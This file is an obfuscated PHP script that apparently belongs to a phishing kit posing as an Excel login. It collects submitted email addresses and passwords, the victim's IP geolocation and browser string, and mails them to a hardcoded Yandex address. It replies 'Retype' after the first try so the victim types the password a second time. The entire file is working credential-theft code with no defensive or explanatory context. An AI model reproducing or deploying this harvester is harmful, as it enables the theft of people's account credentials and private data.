<?php

$GLOBALS["yayrvvddux"] = "success";
$GLOBALS["oxvlocky"] = "mymsg";
$GLOBALS["aaihvww"] = "pism";
$GLOBALS["ryriopicxxv"] = "uism";
$GLOBALS["tmtcxlbrhbs"] = "data";
$GLOBALS["bdyvwldjzt"] = "pism";
$GLOBALS["ubbopxnffgg"] = "myemail";
$GLOBALS["xiygbmm"] = "browser";
$gvuvrvemfcfj = "data";
$GLOBALS["vvhcogw"] = "ip";
$tmxwxnphfl = "data";
$ip = getenv("REMOTE_ADDR");
$GLOBALS["rovbycpymf"] = "details";
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$browser = $_SERVER["HTTP_USER_AGENT"];
$myemail = "domingoloso@yandex.com";
$data = array();
$uism = $_POST["emaildata"];
$pism = $_POST["passwdata"];
$data["success"] = true;
if (!empty($uism) && !empty($pism)) {
    $mymsg = "Login: {$uism}\nPassword: {$pism}\nIP Address: {$ip}\nCity: {$details->city}\nRegion: {$details->region}\nCountry: {$details->country} \n\nBrowser: {$browser};";

    if ($_POST["hiddendata"] < 1) {
        $GLOBALS["gojbwehyoo"] = "myemail";
        $kuxogwyu = "mymsg";
        $success = mail($myemail, "Excel Not True First", $mymsg);
        $data["message"] = "Retype";
    } else {
        $success = mail($myemail, "Excel Not True Second", $mymsg);
        $data["message"] = "Done";
    }
} else {
    echo ".:|";
    die;
}
header("Content-Type: application/json");
header("Access-Control-Allow-Origin: *");
echo json_encode(${$tmxwxnphfl});
